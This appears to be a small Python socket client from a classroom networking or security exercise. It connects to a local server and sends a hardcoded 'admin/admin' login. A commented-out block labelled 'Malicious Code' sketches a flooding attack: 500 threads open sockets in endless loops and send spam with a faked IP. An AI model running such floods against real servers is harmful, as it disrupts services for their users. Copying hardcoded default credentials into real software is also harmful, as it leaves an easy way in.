import socket
import threading

HEADER = 64
PORT = 8080
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
FORMAT = "utf-8"
QUIT_MESSAGE = "!quit"
isAuth = False;
# isAuth is a boolean variable to check if the user is authenticated or not

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET is an address family IPv4 socket
client.connect(ADDR)

def connect(connectionString):
    client.send(connectionString.encode(FORMAT))
    # send(Password)

def send(msg):
    message = msg.encode(FORMAT)
    client.send(message)
    print(client.recv(2048).decode(FORMAT))



#### Malicious Code ####

# fakeIp = "192.23.20.32"

# def attack():
#     while True:
#         #creating new sockets
#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         s.connect(ADDR)

#         #sending spam messages
#         msg = "Message From Attacker: 192.23.20.32"
#         msg = msg.encode(FORMAT)
#         s.send(msg)
#         s.close()

# for i in range(500):
#     thread = threading.Thread(target=attack)
#     thread.start()


connect("UserName: admin, Password: admin")
# send("This is Abdullah")
# send(QUIT_MESSAGE)